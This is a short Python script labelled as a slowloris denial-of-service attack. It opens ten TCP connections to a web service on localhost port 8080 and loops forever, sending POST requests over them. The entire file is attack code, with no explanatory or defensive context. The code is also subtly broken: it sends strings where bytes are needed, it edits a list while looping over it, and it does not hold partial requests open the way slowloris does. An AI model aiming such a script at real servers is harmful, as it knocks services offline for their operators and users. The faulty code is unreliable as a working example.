import socket
import random
import time

targetIp = "127.0.0.1"
targetPort = 8080
numSockets = 10
timeout = 10

def createSocket():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(timeout)
        sock.connect((targetIp, targetPort))
        print("Connected to target successfully!")
        return sock
    except socket.error as exception:
        print(f"Exception occurred: {exception}")
        return None

def slowlorisAttack():
    sockets = []
    for _ in range(numSockets):
        sock = createSocket()
        if sock:
            sockets.append(sock)
        #time.sleep()  # Hold connection for 10 seconds
    
    while True:
        for sock in sockets:
            try:
                sock.send('POST /xml/add_product HTTP/1.1 \r\nConnection:keep-alive\r\nContent-Type:application/json\r\nHost:127.0.0.1:8080\r\n\r\n{\"name\":\"Test\",\"age\":100}')
                #time.sleep(10)
            except socket.error as exception:
                print(f"Exception occurred: {exception}")
                sockets.remove(sock)
                sock.close()

if __name__ == "__main__":
    slowlorisAttack()
